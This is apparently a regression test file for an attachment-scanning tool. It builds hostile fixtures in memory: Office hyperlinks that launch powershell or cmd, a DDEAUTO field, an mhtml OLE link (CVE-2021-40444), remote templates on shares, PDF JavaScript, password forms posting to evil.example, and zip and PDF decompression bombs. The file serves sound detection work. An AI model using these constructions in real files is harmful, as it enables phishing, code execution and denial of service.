// @ts-check
/**
 * @file Regression tests for the attachment checker, from the 2026-11-15 deep review
 * (docs/reviews/2026-11-15-tools-deep-review.md): missed detections, false alarms, and hostile files that hung the
 * checker or filled memory. Fixtures are built here; nothing can run.
 */
import assert from 'node:assert/strict';
import { deflateRawSync, deflateSync } from 'node:zlib';
import { describe, it } from 'node:test';
import { inspectFile } from '../src/client/tool-attachment.mjs';
import { readCfb } from '../src/client/cfb.mjs';
import { inspectDocument } from '../src/client/tool-document.mjs';
import { readZip } from '../src/client/zip.mjs';
import { PROGRAM_STUB, cfb, docx, join, latin1, u16, u32, utf16le, utf8, zip } from './build-files.mjs';

/** @param {Uint8Array | string} data @param {string} name */
const check = (data, name) => inspectFile(new Blob([/** @type {Uint8Array<ArrayBuffer>} */ (typeof data === 'string' ? utf8(data) : data)]), name);
/** @param {import('../src/client/tool-attachment.mjs').FileReport} report */
const keys = (report) => report.findings.map((finding) => finding.key);
/** @param {import('../src/client/tool-attachment.mjs').FileReport} report @param {string} key */
const values = (report, key) => report.findings.find((finding) => finding.key === key)?.values ?? [];
/** Runs `work` and fails if it takes longer than `ms`. @param {number} ms @param {() => Promise<unknown>} work */
async function within(ms, work) {
  const start = Date.now();
  const result = await work();
  assert.ok(Date.now() - start < ms, `took ${Date.now() - start} ms, limit ${ms}`);
  return result;
}

const REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';

describe('review: Office links and templates', () => {
  it('flags a hyperlink that runs a program or opens a share, as in the PowerPoint mouse-over attack', async () => {
    const show = zip([
      { name: '[Content_Types].xml', data: '<Types><Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml"/></Types>' },
      { name: 'ppt/presentation.xml', data: '<p:presentation/>' },
      { name: 'ppt/slides/slide1.xml', data: '<p:sld><a:hlinkMouseOver r:id="rId2" action="ppaction://program"/></p:sld>' },
      { name: 'ppt/slides/_rels/slide1.xml.rels', data: `<Relationships><Relationship Id="rId2" Type="${REL}/hyperlink" Target="powershell.exe -nop -w hidden -c calc" TargetMode="External"/></Relationships>` },
    ]);
    const report = await check(show, 'Order.ppsx');
    assert.equal(report.verdict, 'active');
    assert.deepEqual(values(report, 'linkToProgram'), ['powershell.exe -nop -w hidden -c calc']);
    const share = await check(docx({ rels: `<Relationship Id="r2" Type="${REL}/hyperlink" Target="file://\\\\203.0.113.5\\share\\invoice.exe" TargetMode="External"/>` }), 'a.docx');
    assert.deepEqual(keys(share), ['linkToProgram']);
  });

  it('does not call a local template or a link to another workbook remote', async () => {
    const template = docx({ parts: [{ name: 'word/_rels/settings.xml.rels', data: `<Relationships><Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:///C:\\Users\\anna\\AppData\\Roaming\\Microsoft\\Templates\\Letterhead.dotx" TargetMode="External"/></Relationships>` }] });
    assert.deepEqual(keys(await check(template, 'letter.docx')), []);
    const workbook = zip([
      { name: '[Content_Types].xml', data: '<Types/>' },
      { name: 'xl/workbook.xml', data: '<workbook/>' },
      { name: 'xl/externalLinks/_rels/externalLink1.xml.rels', data: `<Relationships><Relationship Id="rId1" Type="${REL}/externalLinkPath" Target="Budget%202025.xlsx" TargetMode="External"/></Relationships>` },
    ]);
    assert.deepEqual(keys(await check(workbook, 'report.xlsx')), []);
    const remote = docx({ parts: [{ name: 'word/_rels/settings.xml.rels', data: `<Relationships><Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="\\\\203.0.113.5\\t\\x.dotm" TargetMode="External"/></Relationships>` }] });
    assert.deepEqual(keys(await check(remote, 'cv.docx')), ['remote'], 'a template on another computer still is');
  });

  it('says so when Office parts are too large to read, instead of finding nothing', async () => {
    const pad = ' '.repeat(17 * 1024 * 1024);
    const padded = zip([
      { name: '[Content_Types].xml', data: `<Types>${pad}<Override PartName="/word/x.dat" ContentType="application/vnd.ms-office.vbaProject"/></Types>`, deflate: true },
      { name: 'word/document.xml', data: '<w:document/>' },
      { name: 'word/x.dat', data: 'vba' },
    ]);
    const report = await check(padded, 'Invoice.docm');
    assert.equal(report.verdict, 'locked');
    assert.ok(keys(report).includes('partlyRead'));
  });

  it('reads at most a bounded amount of Office parts, however many entries share one', async () => {
    const big = deflateSync(Buffer.from(' '.repeat(8 * 1024 * 1024)), { level: 9 }).subarray(2, -4);
    // 400 directory entries, one stored part: each .rels inflates to 8 MB.
    const names = Array.from({ length: 400 }, (_, i) => `word/_rels/p${i}.rels`);
    const archive = manyZip(['[Content_Types].xml', ...names], (name) => (name.endsWith('.rels') ? { data: big, size: 8 * 1024 * 1024, method: 8 } : { data: utf8('<Types/>'), size: 7, method: 0 }));
    const report = /** @type {import('../src/client/tool-attachment.mjs').FileReport} */ (await within(4000, () => check(archive, 'a.docx')));
    assert.ok(keys(report).includes('partlyRead'));
  });
});

describe('review: evasions', () => {
  it('reads a web page or RTF document even when a stray byte hides its type', async () => {
    const page = await check('\x01<html><body><form action="https://evil.example/x"><input type="password"></form><script>x()</script></body></html>', 'invoice.html');
    assert.deepEqual(keys(page), ['pageScript', 'passwordForm', 'webPage']);
    const rtf = await check(latin1('{\\rtx\x01{\\object\\objemb{\\*\\objclass Equation.3}\\objdata 01050000020000000b0000004571756174696f6e2e3300}}'), 'order.doc');
    assert.equal(rtf.kind, 'rtf');
    assert.ok(keys(rtf).includes('equationEditor'));
  });

  it('catches handler, password and javascript: tricks written with entities or odd spacing', async () => {
    assert.ok(keys(await check('<html><body><svg/onload=fetch(1)></body></html>', 'a.html')).includes('pageScript'));
    assert.ok(keys(await check('<html><body><form action="https://evil.example/x"><input type="pass&#119;ord" name=p></form></body></html>', 'a.html')).includes('passwordForm'));
    assert.ok(keys(await check('<html><body><a href="javascript&colon;go()">x</a></body></html>', 'a.html')).includes('pageScript'));
    assert.ok(keys(await check('<html><body><a href="java\tscript:go()">x</a></body></html>', 'a.html')).includes('pageScript'));
  });

  it('keeps every finding when one part of a file has a broken character reference', async () => {
    const report = await check(zip([{ name: 'invoice.exe', data: PROGRAM_STUB }, { name: 'a.html', data: '<html><a href="&#x110000;">x</a></html>' }]), 'files.zip');
    assert.equal(report.verdict, 'program');
    assert.deepEqual(values(report, 'insideProgram'), ['invoice.exe']);
  });

  it('reads a ZIP archive with bytes in front of it, as archive tools do', async () => {
    const archive = zip([{ name: 'invoice.exe', data: PROGRAM_STUB }]);
    const report = await check(join(utf8('hello'), archive), 'invoice.zip');
    assert.equal(report.kind, 'zip');
    assert.equal(report.verdict, 'program');
  });

  it('takes the extension a file manager would see from a name ending in dots or spaces', async () => {
    const report = await check(zip([{ name: 'invoice.js.', data: 'WScript.Shell' }]), 'a.zip');
    assert.equal(report.verdict, 'program');
  });

  it('applies long tar names and reads contiguous files', async () => {
    const long = `Invoice_2025_${'x'.repeat(100)}.js`;
    const script = utf8('WScript.CreateObject("WScript.Shell").Run("calc")');
    const tar = join(tarHeader('././@LongLink', long.length + 1, 'L'), pad512(utf8(`${long}\0`)), tarHeader(long, script.length, '0'), pad512(script), new Uint8Array(1024));
    assert.equal((await check(tar, 'docs.tar')).verdict, 'program');
    const pax = join(tarHeader('PaxHeader', 0, 'x', paxRecord('path', long)), tarHeader('short', script.length, '0'), pad512(script), new Uint8Array(1024));
    assert.equal((await check(pax, 'docs.tar')).verdict, 'program');
    const contiguous = join(tarHeader('invoice.exe', PROGRAM_STUB.length, '7'), pad512(PROGRAM_STUB), new Uint8Array(1024));
    assert.equal((await check(contiguous, 'docs.tar')).verdict, 'program');
  });

  it('finds JavaScript even when a later object with the same number shadows it', async () => {
    const pdf = '%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 5 0 R >> endobj\n5 0 obj << /S /JavaScript /JS (app.alert\\(1\\)) >> endobj\n6 0 obj << /Length 40 >> stream\n\n5 0 obj << >> endobj\n                   \nendstream endobj\ntrailer << /Root 1 0 R >>\n%%EOF';
    const report = await check(latin1(pdf), 'invoice.pdf');
    assert.ok(keys(report).includes('pdfJavaScript'));
    assert.ok(keys(report).includes('pdfAutoAction'));
  });
});

describe('review: Outlook messages', () => {
  const props = { path: '__properties_version1.0', data: new Uint8Array(32) };
  const script = utf8('WScript.CreateObject("WScript.Shell").Run("calc")');

  it('reads attachment names stored as 8-bit text', async () => {
    const message = cfb([props, { path: '__attach_version1.0_#00000000/__substg1.0_3707001E', data: latin1('invoice.js') }, { path: '__attach_version1.0_#00000000/__substg1.0_37010102', data: script }]);
    const report = await check(message, 'mail.msg');
    assert.deepEqual(report.inside.map((item) => `${item.name} ${item.verdict}`), ['invoice.js program']);
  });

  it('opens an attached message and checks its attachments', async () => {
    const message = cfb([
      props,
      { path: '__attach_version1.0_#00000000/__substg1.0_3707001F', data: utf16le('Fwd.msg') },
      { path: '__attach_version1.0_#00000000/__substg1.0_3701000D/__properties_version1.0', data: new Uint8Array(32) },
      { path: '__attach_version1.0_#00000000/__substg1.0_3701000D/__attach_version1.0_#00000000/__substg1.0_3707001F', data: utf16le('invoice.exe') },
      { path: '__attach_version1.0_#00000000/__substg1.0_3701000D/__attach_version1.0_#00000000/__substg1.0_37010102', data: PROGRAM_STUB },
    ]);
    const report = await check(message, 'mail.msg');
    assert.equal(report.verdict, 'program');
    assert.deepEqual(report.inside.map((item) => item.name), ['Fwd.msg/invoice.exe']);
  });

  it('still checks the other attachments when one name is very long', async () => {
    const attach = (/** @type {number} */ n, /** @type {string} */ name) => [
      { path: `__attach_version1.0_#0000000${n}/__substg1.0_3707001F`, data: utf16le(name) },
      { path: `__attach_version1.0_#0000000${n}/__substg1.0_37010102`, data: PROGRAM_STUB },
    ];
    const report = await check(cfb([props, ...attach(0, `${'a'.repeat(2100)}.exe`), ...attach(1, 'x.exe')]), 'mail.msg');
    assert.equal(report.verdict, 'program');
    assert.equal(report.insideTotal, 2);
  });
});

describe('review: false alarms', () => {
  it('does not call a newsletter with an inline picture and the word "download" smuggling', async () => {
    const report = await check(`<html><body><img src="data:image/png;base64,${'A'.repeat(25000)}"><p>Tap here to download the app</p></body></html>`, 'news.html');
    assert.deepEqual(keys(report), ['webPage']);
  });

  it('does not take text for a picture or a program, or common page starts for a disguise', async () => {
    assert.deepEqual(keys(await check('BMI,weight,height\n22,70,180\n', 'health.csv')), []);
    assert.deepEqual(keys(await check('MZ Bank statement\n', 'notes.txt')), []);
    assert.deepEqual(keys(await check('<meta charset="utf-8"><p>Hello</p>', 'mail.html')), ['webPage']);
    assert.deepEqual(keys(await check('<!-- icon --><svg xmlns="http://www.w3.org/2000/svg"></svg>', 'icon.svg')), ['svgPage']);
    assert.deepEqual(keys(await check('<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "x"><svg xmlns="http://www.w3.org/2000/svg"></svg>', 'icon.svg')), ['svgPage']);
  });

  it('does not read sheet details that a password-protected workbook encrypts', async () => {
    const record = (/** @type {number} */ type, /** @type {number[]} */ body) => join(u16(type), u16(body.length), body);
    const workbook = join(record(0x0809, new Array(16).fill(0)), record(0x002f, new Array(6).fill(0)), record(0x0085, [0, 0, 0, 0, 0x7e, 0x01, 1, 0, 0x41]), record(0x000a, []));
    assert.deepEqual(keys(await check(cfb([{ path: 'Workbook', data: workbook }]), 'budget.xls')), ['encrypted']);
  });

  it('does not call a PDF that opens on a given page active', async () => {
    const pdf = '%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction << /S /GoTo /D [3 0 R /Fit] >> >> endobj\n2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n3 0 obj << /Type /Page /Parent 2 0 R >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF';
    assert.deepEqual(keys(await check(latin1(pdf), 'report.pdf')), []);
  });

  it('reads an internet shortcut that starts with a property section', async () => {
    const report = await check(latin1('[{000214A0-0000-0000-C000-000000000046}]\r\nProp3=19,11\r\n[InternetShortcut]\r\nURL=https://example.org/\r\nWorkingDirectory=\\\\192.0.2.5@SSL\\x\r\n'), 'Example.url');
    assert.equal(report.kind, 'url');
    assert.deepEqual(keys(report), ['shortcut', 'remoteFolder']);
  });
});

describe('review: hostile files stay fast and small', () => {
  it('checks a ZIP of 65,534 entries quickly', async () => {
    const archive = manyZip(Array.from({ length: 65534 }, (_, i) => `f${i}`), () => ({ data: new Uint8Array(0), size: 0, method: 0 }));
    await within(5000, () => check(archive, 'a.zip'));
  });

  it('reads PDFs with many unfinished objects, an absurd object count, or an inflating stream within limits', async () => {
    await within(3000, () => check(latin1(`%PDF-1.4\n${'1 0 obj\n'.repeat(60000)}`), 'a.pdf'));
    const inner = deflateSync(Buffer.from('1 0 << >>'));
    await within(3000, () => check(join(latin1(`%PDF-1.7\n3 0 obj << /Type /ObjStm /N 300000000 /First 4 /Length ${inner.length} /Filter /FlateDecode >> stream\n`), inner, latin1('\nendstream endobj\n%%EOF')), 'a.pdf'));
    const bomb = deflateSync(Buffer.alloc(200 * 1024 * 1024), { level: 9 });
    const pdf = join(latin1(`%PDF-1.7\n1 0 obj << /Type /Filespec /F (a.txt) /EF << /F 2 0 R >> >> endobj\n2 0 obj << /Type /EmbeddedFile /Length ${bomb.length} /Filter /FlateDecode >> stream\n`), bomb, latin1('\nendstream endobj\n%%EOF'));
    const report = /** @type {import('../src/client/tool-attachment.mjs').FileReport} */ (await within(8000, () => check(pdf, 'a.pdf')));
    assert.equal(report.inside[0]?.verdict, 'locked', 'the attachment is reported as too large, not unpacked');
  });

  it('stops a compound file DIFAT chain and a deep directory tree early', async () => {
    const sector = 512;
    const sectors = 200000;
    const difat = new Uint8Array(sector * (sectors + 1));
    difat.set([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]);
    const view = new DataView(difat.buffer);
    view.setUint16(26, 3, true);
    view.setUint16(30, 9, true);
    view.setUint32(68, 0, true);
    for (let s = 0; s < sectors; s += 1) view.setUint32(sector * (s + 1) + sector - 4, s + 1 < sectors ? s + 1 : 0xfffffffe, true);
    await within(1500, () => check(difat, 'a.doc'));
    await within(1500, async () => assert.throws(() => readCfb(deepTree(20000)), { name: 'CfbError' }));
    assert.equal(readCfb(deepTree(60)).entries.length, 61, 'nesting as deep as real files is listed in full');
  });

  it('bounds an ISO image whose directories point at each other', async () => {
    await within(1000, () => check(isoFanOut(), 'a.iso'));
  });
});

/* ---------- Fixture helpers ---------- */

/**
 * A stored or deflated ZIP with many entries, built with typed arrays for speed.
 * @param {string[]} names
 * @param {(name: string) => { data: Uint8Array, size: number, method: number }} dataFor
 */
function manyZip(names, dataFor) {
  /** @type {Uint8Array[]} */
  const parts = [];
  /** @type {Uint8Array[]} */
  const central = [];
  let offset = 0;
  for (const name of names) {
    const raw = utf8(name);
    const { data, size, method } = dataFor(name);
    const local = new Uint8Array(30);
    const lv = new DataView(local.buffer);
    lv.setUint32(0, 0x04034b50, true);
    lv.setUint16(4, 20, true);
    lv.setUint16(8, method, true);
    lv.setUint32(18, data.length, true);
    lv.setUint32(22, size, true);
    lv.setUint16(26, raw.length, true);
    const entry = new Uint8Array(46);
    const cv = new DataView(entry.buffer);
    cv.setUint32(0, 0x02014b50, true);
    cv.setUint16(4, 20, true);
    cv.setUint16(6, 20, true);
    cv.setUint16(10, method, true);
    cv.setUint32(20, data.length, true);
    cv.setUint32(24, size, true);
    cv.setUint16(28, raw.length, true);
    cv.setUint32(42, offset, true);
    parts.push(local, raw, data);
    central.push(entry, raw);
    offset += 30 + raw.length + data.length;
  }
  const directory = Buffer.concat(central);
  const end = new Uint8Array(22);
  const ev = new DataView(end.buffer);
  ev.setUint32(0, 0x06054b50, true);
  ev.setUint16(8, names.length, true);
  ev.setUint16(10, names.length, true);
  ev.setUint32(12, directory.length, true);
  ev.setUint32(16, offset, true);
  return new Uint8Array(Buffer.concat([...parts, directory, end]));
}

/** @param {Uint8Array} data */
const pad512 = (data) => join(data, new Uint8Array((512 - (data.length % 512)) % 512));

/** A pax extended header record: "<length> key=value\n", the length counting itself. @param {string} key @param {string} value */
function paxRecord(key, value) {
  const body = ` ${key}=${value}\n`;
  let length = body.length + 1;
  while (String(length).length + body.length !== length) length += 1;
  return utf8(`${length}${body}`);
}

/**
 * A ustar header, with `data` (pax records) following it when given.
 * @param {string} name @param {number} size @param {string} type @param {Uint8Array} [data]
 */
function tarHeader(name, size, type, data) {
  const header = new Uint8Array(512);
  const bytes = data ?? new Uint8Array(0);
  header.set(latin1(name.slice(0, 100)));
  header.set(latin1(`${(data ? bytes.length : size).toString(8).padStart(11, '0')}\0`), 124);
  header[156] = type.charCodeAt(0);
  header.set(latin1('ustar\x0000'), 257);
  return data ? join(header, pad512(bytes)) : header;
}

/** A compound file whose directory is a chain of `depth` storages, each the only child of the last. @param {number} depth */
function deepTree(depth) {
  const sector = 512;
  const dirSectors = Math.ceil((depth + 1) / 4);
  const fatSectors = Math.ceil((dirSectors + 2) / 128);
  const bytes = new Uint8Array(sector * (1 + fatSectors + dirSectors));
  const view = new DataView(bytes.buffer);
  bytes.set([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]);
  view.setUint16(26, 3, true);
  view.setUint16(30, 9, true);
  view.setUint32(44, fatSectors, true);
  view.setUint32(48, fatSectors, true);
  view.setUint32(56, 4096, true);
  view.setUint32(60, 0xfffffffe, true);
  view.setUint32(68, 0xfffffffe, true);
  for (let i = 0; i < 109; i += 1) view.setUint32(76 + i * 4, i < fatSectors ? i : 0xffffffff, true);
  const fat = sector;
  for (let i = 0; i < fatSectors * 128; i += 1) view.setUint32(fat + i * 4, 0xffffffff, true);
  for (let i = 0; i < fatSectors; i += 1) view.setUint32(fat + i * 4, 0xfffffffd, true);
  for (let i = 0; i < dirSectors; i += 1) view.setUint32(fat + (fatSectors + i) * 4, i === dirSectors - 1 ? 0xfffffffe : fatSectors + i + 1, true);
  const directory = sector * (1 + fatSectors);
  for (let id = 0; id <= depth; id += 1) {
    const at = directory + id * 128;
    bytes.set(utf16le('S'), at);
    view.setUint16(at + 64, 4, true);
    bytes[at + 66] = id === 0 ? 5 : 1;
    view.setUint32(at + 68, 0xffffffff, true);
    view.setUint32(at + 72, 0xffffffff, true);
    view.setUint32(at + 76, id < depth ? id + 1 : 0xffffffff, true);
    view.setUint32(at + 116, 0xfffffffe, true);
  }
  return bytes;
}

/** An ISO image whose 1 MB root directory is full of hidden subdirectories pointing back into itself. */
function isoFanOut() {
  const sector = 2048;
  const root = 18;
  const dirBytes = 1024 * 1024;
  const dirSectors = dirBytes / sector;
  const bytes = new Uint8Array(sector * (root + dirSectors + 1));
  const view = new DataView(bytes.buffer);
  const record = (/** @type {number} */ at, /** @type {number} */ lba, /** @type {number} */ flags, /** @type {number} */ name) => {
    bytes[at] = 34;
    view.setUint32(at + 2, lba, true);
    view.setUint32(at + 10, dirBytes, true);
    bytes[at + 25] = flags;
    bytes[at + 32] = 1;
    bytes[at + 33] = name;
  };
  const pvd = 16 * sector;
  bytes.set([1, ...latin1('CD001'), 1], pvd);
  record(pvd + 156, root, 2, 0);
  bytes.set([255, ...latin1('CD001'), 1], 17 * sector);
  let i = 0;
  for (let at = root * sector; at + 34 <= (root + dirSectors) * sector; at += 34) {
    if (Math.floor(at / sector) !== Math.floor((at + 33) / sector)) {
      at = (Math.floor(at / sector) + 1) * sector - 34;
      continue;
    }
    i += 1;
    record(at, root + (i % dirSectors), 3, 0x41 + (i % 26));
  }
  return bytes;
}

/* ---------- Final review, 2026-11-15 ---------- */

const rel = (/** @type {string} */ type, /** @type {string} */ target, external = true) => `<Relationship Id="rId9" Type="${REL}/${type}" Target="${target}"${external ? ' TargetMode="External"' : ''}/>`;

describe('final review: missed detections', () => {
  it('finds an external OLE object loaded through mhtml: (CVE-2021-40444) and templates on shares written as file: addresses', async () => {
    assert.deepEqual(keys(await check(docx({ rels: rel('oleObject', 'mhtml:http://198.51.100.7/x.html!x-usc:http://198.51.100.7/x.html') }), 'a.docx')), ['remote']);
    const settings = (/** @type {string} */ target) => docx({ parts: [{ name: 'word/_rels/settings.xml.rels', data: `<Relationships>${rel('attachedTemplate', target)}</Relationships>` }] });
    for (const target of ['file:///\\\\198.51.100.7\\share\\t.dotm', 'file:////198.51.100.7/share/t.dotm']) assert.deepEqual(keys(await check(settings(target), 'b.docx')), ['remote'], target);
  });

  it('finds remote templates and fields in RTF and Word documents', async () => {
    assert.deepEqual(keys(await check(latin1('{\\rtf1{\\*\\template http://198.51.100.7/t.doc}Hello}'), 'c.rtf')), ['remote']);
    assert.deepEqual(keys(await check(latin1('{\\rtf1{\\field{\\*\\fldinst INCLUDEPICTURE "\\\\\\\\198.51.100.7\\\\s\\\\a.png" \\\\d}{\\fldrslt x}}}'), 'c.rtf')), ['remote']);
    const field = '<w:p><w:r><w:instrText> INCLUDEPICTURE "http://198.51.100.7/pixel.png" \\d </w:instrText></w:r></w:p>';
    assert.deepEqual(keys(await check(docx({ body: field }), 'c.docx')), ['remote']);
  });

  it('opens an RTF chunk inside a Word document (altChunk)', async () => {
    const rtf = '{\\rtf1{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata 01050000020000000b0000004571756174696f6e2e3300}}}';
    const report = await check(docx({ rels: rel('aFChunk', 'afchunk.rtf', false), body: '<w:altChunk r:id="rId9"/>', parts: [{ name: 'word/afchunk.rtf', data: rtf }] }), 'invoice.docx');
    assert.equal(report.verdict, 'active');
    assert.deepEqual(values(report, 'insideActive'), ['afchunk.rtf']);
  });

  it('finds "run program" actions in slide layouts and program links written as file: addresses', async () => {
    const show = zip([
      { name: '[Content_Types].xml', data: '<Types/>' },
      { name: 'ppt/presentation.xml', data: '<p:presentation/>' },
      { name: 'ppt/slideLayouts/slideLayout1.xml', data: '<p:sldLayout><a:hlinkHover r:id="rId9" action="ppaction://program"/></p:sldLayout>' },
      { name: 'ppt/slideLayouts/_rels/slideLayout1.xml.rels', data: `<Relationships>${rel('hyperlink', 'file:///C:\\Windows\\System32\\cmd.exe /c calc')}</Relationships>` },
    ]);
    assert.deepEqual(values(await check(show, 'e.pptx'), 'linkToProgram'), ['file:///C:\\Windows\\System32\\cmd.exe /c calc']);
  });

  it('finds DDEAUTO in a Word 97–2003 document', async () => {
    const word = cfb([{ path: 'WordDocument', data: join(new Uint8Array(1536), latin1('\x13 DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" \x14x\x15')) }, { path: '1Table', data: new Uint8Array(600) }]);
    assert.ok(keys(await check(word, 'd.doc')).includes('dde'));
  });
});

describe('final review: false alarms', () => {
  it('does not flag JS or AA that only appear inside stream data', async () => {
    const data = 'thumbnail/JS/x/AA/y/JavaScript/OpenAction';
    const pdf = latin1(`%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj\n2 0 obj << /Length ${data.length} >>\nstream\n${data}\nendstream\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF`);
    assert.deepEqual(keys(await check(pdf, 'brochure.pdf')), []);
    const report = await inspectDocument(pdf);
    assert.ok(!report.findings.some((finding) => finding.key === 'scripts'), 'the document tool reads only dictionaries too');
  });

  it('does not call ordinary hyperlinks links to programs', async () => {
    for (const target of ['Explorer brochure.pdf', 'C:\\Manuals\\Explorer-2024.pdf', 'curl-notes.txt', 'www.example.com', 'www.firma.pl', '\\\\fileserver\\Finance\\Q3.xlsx', 'tel:+15551234567']) {
      assert.deepEqual(keys(await check(docx({ rels: rel('hyperlink', target) }), 'f.docx')), [], target);
    }
    assert.deepEqual(keys(await check(docx({ rels: rel('hyperlink', '\\\\fileserver\\Finance\\update.exe') }), 'f.docx')), ['linkToProgram'], 'a program on a share still is');
  });

  it('does not call structured data in a newsletter a script', async () => {
    assert.deepEqual(keys(await check('<html><head><script type="application/ld+json">{"@type":"Order"}</script></head><body>Hi</body></html>', 'mail.html')), ['webPage']);
  });

  it('does not report attachments sent as links in a message as unread', async () => {
    const message = cfb([{ path: '__properties_version1.0', data: new Uint8Array(32) }, { path: '__attach_version1.0_#00000000/__substg1.0_3707001F', data: utf16le('Budget.xlsx') }]);
    assert.deepEqual(keys(await check(message, 'mail.msg')), []);
  });
});

describe('final review: hostile files and counts', () => {
  it('charges failed reads to the budget, so a repeated inflation runs once', async () => {
    const stored = deflateRawSync(Buffer.alloc(16 * 1024 * 1024 - 1), { level: 9 });
    await within(4000, () => check(overlapZip(300, 'a.bin', stored, 16 * 1024 * 1024, (i) => `a${i}.bin`), 'm.zip'));
    await within(4000, () => check(overlapZip(300, 'x.rels', stored, 16 * 1024 * 1024, (i) => (i === 0 ? '[Content_Types].xml' : `r${i}.rels`)), 'o.docx'));
    const bomb = deflateSync(Buffer.alloc(64 * 1024 * 1024 + 1024), { level: 9 });
    const parts = [latin1(`%PDF-1.7\n1 0 obj\n<</Length ${bomb.length} /Filter /FlateDecode>>stream\n`), bomb, latin1('\nendstream\nendobj\n')];
    for (let i = 0; i < 100; i += 1) parts.push(latin1(`${i + 2} 0 obj\n<</Type /Filespec /F (a${i}.exe) /EF <</F 1 0 R>>>>\nendobj\n`));
    await within(4000, () => check(join(...parts), 's.pdf'));
  });

  it('bounds object streams that overlap or inflate a lot, in both PDF readers', async () => {
    const count = 2000;
    const size = 1024 * 1024;
    const pairs = Array.from({ length: count }, (_, i) => `${i + 10} ${i % 2 ? size : 0}`).join(' ') + ' ';
    const packed = deflateSync(Buffer.concat([Buffer.from(pairs), Buffer.alloc(size, 0x41)]), { level: 9 });
    const pdf = join(latin1(`%PDF-1.7\n1 0 obj\n<</Type /ObjStm /N ${count} /First ${pairs.length} /Length ${packed.length} /Filter /FlateDecode>>stream\n`), packed, latin1('\nendstream\nendobj\ntrailer<</Root 1 0 R>>\n%%EOF\n'));
    await within(3000, () => check(pdf, 'o.pdf'));
    await within(3000, () => inspectDocument(pdf));
    const bomb = deflateSync(Buffer.alloc(64 * 1024 * 1024 + 1024), { level: 9 });
    const many = [latin1('%PDF-1.7\n')];
    for (let i = 0; i < 12; i += 1) many.push(latin1(`${i + 1} 0 obj\n<</Type /ObjStm /N 1 /First 4 /Length ${bomb.length} /Filter /FlateDecode>>stream\n`), bomb, latin1('\nendstream\nendobj\n'));
    await within(5000, () => check(join(...many), 'b.pdf'));
  });

  it('stays fast on deep folder names, attachment entries without endobj, and archives of archives', async () => {
    await within(1500, () => check(zip([{ name: `${'a/'.repeat(30000)}x`, data: 'x' }]), 'p.zip'));
    const specs = ['%PDF-1.7\n1 0 obj\n<</Length 0>>stream\n\nendstream\n', ...Array.from({ length: 30000 }, () => '2 0 obj<</EF<</F 1 0 R>>>>\n')].join('');
    await within(3000, () => check(latin1(specs), 'i.pdf'));
    const inner = zip(Array.from({ length: 2000 }, (_, i) => ({ name: `${i}`, data: 'x' })));
    const outer = zip(Array.from({ length: 60 }, (_, i) => ({ name: `${i}.zip`, data: inner, deflate: true })));
    await within(6000, () => check(outer, 'n.zip'));
  });

  it('counts the files inside nested archives', async () => {
    const inner = zip(Array.from({ length: 2000 }, (_, i) => ({ name: `${i}`, data: 'x' })));
    assert.equal((await check(zip([{ name: 'a.zip', data: inner, deflate: true }, { name: 'b.zip', data: inner, deflate: true }]), 'n.zip')).insideTotal, 4002);
  });

  it('reads a ZIP with ZIP64 end records whose first directory entry is 76 bytes long', async () => {
    const archive = zip([{ name: 'quarterly-report-final-v2.docx', data: 'x' }, { name: 'payload.exe', data: 'MZ' }, { name: 'c.txt', data: 'c' }]);
    const view = new DataView(archive.buffer);
    const end = archive.length - 22;
    const size = view.getUint32(end + 12, true);
    const start = view.getUint32(end + 16, true);
    const record = [...u32(0x06064b50), ...u32(44), 0, 0, 0, 0, ...u16(45), ...u16(45), ...u32(0), ...u32(0), ...u32(3), ...u32(0), ...u32(3), ...u32(0), ...u32(size), ...u32(0), ...u32(start), ...u32(0)];
    const locator = [...u32(0x07064b50), ...u32(0), ...u32(end), ...u32(0), ...u32(1)];
    const zip64 = join(archive.subarray(0, end), record, locator, archive.subarray(end));
    assert.deepEqual(readZip(zip64).map((entry) => entry.name), ['quarterly-report-final-v2.docx', 'payload.exe', 'c.txt']);
  });

  it('says a tar entry cut short was not read', async () => {
    const header = new Uint8Array(512);
    header.set(latin1('a.exe'));
    header.set(latin1('00000001000\0'), 124);
    header[156] = 0x30;
    header.set(latin1('ustar\x0000'), 257);
    assert.ok(keys(await check(join(header, new Uint8Array(100)), 'a.tar')).includes('partlyRead'));
  });
});

/**
 * A ZIP whose directory entries all point at one local header and one stored stream.
 * @param {number} count @param {string} localName @param {Uint8Array} stored @param {number} declared @param {(i: number) => string} centralName
 */
function overlapZip(count, localName, stored, declared, centralName) {
  const shared = (/** @type {number} */ nameLength) => [...u16(0), ...u16(8), ...u32(0), ...u32(0), ...u32(stored.length), ...u32(declared), ...u16(nameLength), ...u16(0)];
  const nameBytes = latin1(localName);
  const local = Uint8Array.from([...u32(0x04034b50), ...u16(20), ...shared(nameBytes.length), ...nameBytes]);
  /** @type {Uint8Array[]} */
  const central = [];
  for (let i = 0; i < count; i += 1) {
    const name = latin1(centralName(i));
    central.push(Uint8Array.from([...u32(0x02014b50), ...u16(20), ...u16(20), ...shared(name.length), ...u16(0), ...u16(0), ...u16(0), ...u32(0), ...u32(0)]), name);
  }
  const directory = Buffer.concat(central);
  const end = Uint8Array.from([...u32(0x06054b50), ...u16(0), ...u16(0), ...u16(count), ...u16(count), ...u32(directory.length), ...u32(local.length + stored.length), ...u16(0)]);
  return new Uint8Array(Buffer.concat([local, stored, directory, end]));
}
